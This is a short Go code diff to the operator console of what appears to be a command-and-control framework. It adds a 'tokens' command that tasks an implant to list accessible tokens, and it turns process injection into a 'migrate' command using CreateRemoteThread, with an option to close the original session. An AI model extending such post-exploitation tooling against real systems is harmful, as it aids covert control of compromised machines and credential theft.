@@ -395,6 +395,9 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 	c.App.AddCommand(&grumble.Command{
 		Name: "tokens",
 		Help: "list accessable tokens",
+		Run: func(c *grumble.Context) error {
+			return SendTask(agentid, "tokens", "list")
+		},
 	})
 
 	c.App.AddCommand(&grumble.Command{
@@ -408,13 +411,16 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 	})
 
 	c.App.AddCommand(&grumble.Command{
-		Name: "inject",
-		Help: "inject into remote process using CreateRemoteThread",
+		Name: "migrate",
+		Help: "migrate into remote process using CreateRemoteThread; note this will not close the current process unless -c is specified (this is risky since if the process you inject to is close, you session will end)",
 		Args: func(a *grumble.Args) {
 			a.String("pid", "process to inject into")
 		},
+		Flags: func(f *grumble.Flags) {
+			f.Bool("-c", "--close", false, "close your current session/process after a successful injection")
+		},
 		Run: func(c *grumble.Context) error {
-			return SendTask(agentid, "inject", c.Args.String("pid"))
+			return SendTask(agentid, "migrate", c.Args.String("pid")+" -- "+fmt.Sprint(c.Flags.Bool("close")))
 		},
 	})
 }
